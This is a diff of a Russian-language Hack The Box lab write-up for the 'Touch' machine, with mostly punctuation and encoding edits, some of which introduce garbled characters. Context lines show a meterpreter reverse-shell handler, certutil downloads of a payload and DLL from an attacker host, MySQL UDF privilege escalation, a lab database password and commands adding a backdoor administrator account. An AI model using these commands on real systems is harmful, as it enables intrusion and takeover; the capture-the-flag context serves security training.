@@ -1,4 +1,4 @@
-# Touch (HTB)
+﻿# Touch (HTB)
 
 > Платформа: Hack The Box  
 > Сезон: 12 / Aero  
@@ -92,9 +92,9 @@ nmap -sV -sC 10.129.71.63
 | 135  | Microsoft Windows RPC                     |
 | 3389 | Microsoft Terminal Service (RDP)          |
 | 5985 | Microsoft HTTPAPI httpd 2.0 (WinRM)       |
-| 8443 | Microsoft HTTPAPI httpd 2.0 — Nexion DeviceHub |
+| 8443 | Microsoft HTTPAPI httpd 2.0 - Nexion DeviceHub |
 
-Порт 8443 — **Nexion DeviceHub - Login**.
+Порт 8443 - **Nexion DeviceHub - Login**.
 
 ---
 
@@ -194,7 +194,7 @@ python3 -m http.server 8000
 msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.82; set LPORT 4445; exploit"
 ```
 
-�-агрузка и запуск:
+�-агрузка и запуск:
 
 ```cmd
 certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
@@ -228,7 +228,7 @@ whoami /groups
 
 **Группы:** `KIOSK-042\Printer Administrators`, `BUILTIN\Remote Desktop Users`, `BUILTIN\Users`.
 
-**`SeImpersonatePrivilege` отсутствует** — JuicyPotato/PrintSpoofer/GodPotato не подходят.
+**`SeImpersonatePrivilege` отсутствует** - JuicyPotato/PrintSpoofer/GodPotato не подходят.
 
 ---
 
@@ -256,8 +256,8 @@ type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
 
 Ключевое:
 
-- `document-service.ts` — OCR MRZ через tesseract.js.
-- `staff.ts` — декод QR `HTBAW-STAFF:<email>:<authCode>`, проверка в `_htb_staff`.
+- `document-service.ts` - OCR MRZ через tesseract.js.
+- `staff.ts` - декод QR `HTBAW-STAFF:<email>:<authCode>`, проверка в `_htb_staff`.
 
 **Креды MySQL из `database/index.ts`:**
 
@@ -311,13 +311,13 @@ icacls "C:\MySQL\lib\plugin"
 NT AUTHORITY\Authenticated Users:(I)(M)
 ```
 
-`M` — `KioskUser` может писать в директорию плагинов.
+`M` - `KioskUser` может писать в директорию плагинов.
 
 ---
 
 ## Privilege Escalation (MySQL UDF Hijacking)
 
-�-агрузка DLL:
+�-агрузка DLL:
 
 ```
 meterpreter > upload /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
@@ -356,20 +356,20 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 <ROOT_FLAG>
 ```
 
-### Опционально — интерактивный SYSTEM
+### Опционально - интерактивный SYSTEM
 
 ```powershell
 & "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net user hacker P@ssw0rd123! /add');"
 & "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
 ```
 
-Далее — RDP/WinRM как `hacker`.
+Далее - RDP/WinRM как `hacker`.
 
 ---
 
 ## Flags
 
-| Флаг | �-начение                         |
+| Флаг | �-начение                         |
 |------|----------------------------------|
 | User | <USER_FLAG> |
 | Root | <ROOT_FLAG> |
@@ -378,10 +378,10 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 
 ## Key Takeaways
 
-- **Утечка серийного номера через `/api/status` без аутентификации** — пароль от DeviceHub.
-- **Kiosk escape через манипуляцию состоянием оборудования** — выключение сканера в панели админа → новая ошибка с кликабельной ссылкой.
-- **Ctrl+O как universal escape hatch** — диалог Open File даёт доступ к проводнику и запуск `cmd.exe`.
-- **Пароли в открытом виде в .bat/.sql** — `refresh-dates.bat` содержит root-пароль MySQL.
-- **MySQL File_priv + writable plugin directory = RCE** — UDF hijacking.
-- **MySQL как служба Windows запускается от SYSTEM** — компрометация СУБД с UDF напрямую даёт SYSTEM.
-- **Отсутствие SeImpersonatePrivilege не тупик** — ищем альтернативные векторы через локальные сервисы.
+- **Утечка серийного номера через `/api/status` без аутентификации** - пароль от DeviceHub.
+- **Kiosk escape через манипуляцию состоянием оборудования** - выключение сканера в панели админа → новая ошибка с кликабельной ссылкой.
+- **Ctrl+O как universal escape hatch** - диалог Open File даёт доступ к проводнику и запуск `cmd.exe`.
+- **Пароли в открытом виде в .bat/.sql** - `refresh-dates.bat` содержит root-пароль MySQL.
+- **MySQL File_priv + writable plugin directory = RCE** - UDF hijacking.
+- **MySQL как служба Windows запускается от SYSTEM** - компрометация СУБД с UDF напрямую даёт SYSTEM.
+- **Отсутствие SeImpersonatePrivilege не тупик** - ищем альтернативные векторы через локальные сервисы.
